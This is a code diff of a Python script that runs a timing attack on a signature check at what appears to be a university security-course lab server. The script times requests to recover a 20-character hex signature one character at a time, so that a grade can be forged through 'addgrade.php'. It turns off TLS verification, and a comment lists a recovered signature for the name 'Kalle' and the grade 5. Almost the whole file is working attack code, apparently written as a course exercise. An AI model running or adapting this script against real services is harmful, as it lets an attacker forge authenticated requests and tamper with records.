@@ -1,26 +1,30 @@
 import requests
 
-def sort(chars, size=3):
+requests.packages.urllib3.disable_warnings()
+
+def sort(chars, size=4):
   top = sorted(chars, key=lambda x: -x[1])[:size]
   return [ x for x, y in top ]
 
 def most_common(L):
   return max(set(L), key=L.count)
 
-requests.packages.urllib3.disable_warnings()
-hex_string = '0123456789abcdef'
-
-def chrcmp_hack(name, grade):
+# An timing attack based on bad chrcmp function
+# that even works on Wi-Fi eduroam
+def timing_attack(name, grade, size=20):
   url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
   params = {'name': name, 'grade': grade, 'signature': ''}
-  print(params)
+  hex_string = '0123456789abcdef'
+  print('Searching...')
 
-  signature = [''] * 20
+  signature = [''] * size
 
-  for i in range(len(signature)):
+  for i in range(size):
     sig_chars = []
-    for RETRY in range(15):
+
+    for RETRY in range(20):
       chars = []
+
       for j in range(len(hex_string)):
         params['signature'] = ''.join(signature[:i]) + hex_string[j]
 
@@ -32,11 +36,15 @@ def chrcmp_hack(name, grade):
       sig_chars.extend(sort(chars))
 
     signature[i] = most_common(sig_chars)
-    print(''.join(signature))
+    print('{}/{}'.format(i+1, size), ''.join(signature))
   
-  return ''.join(signature)
+  params['signature'] = ''.join(signature)
+  r = requests.get(url, params, verify=False)
+  print('Sign verified:', int(r.text) == 1)
+
+  return params
 
 if __name__ == '__main__':
-  print('6823ea50b133c58cba36')
-  sign = chrcmp_hack(input('Name: '), int(input('Grade: ')))
-  print(sign)
+  # Kalle, 5 => 6823ea50b133c58cba36
+  params = timing_attack(input('Name: '), int(input('Grade: ')))
+  print(params)
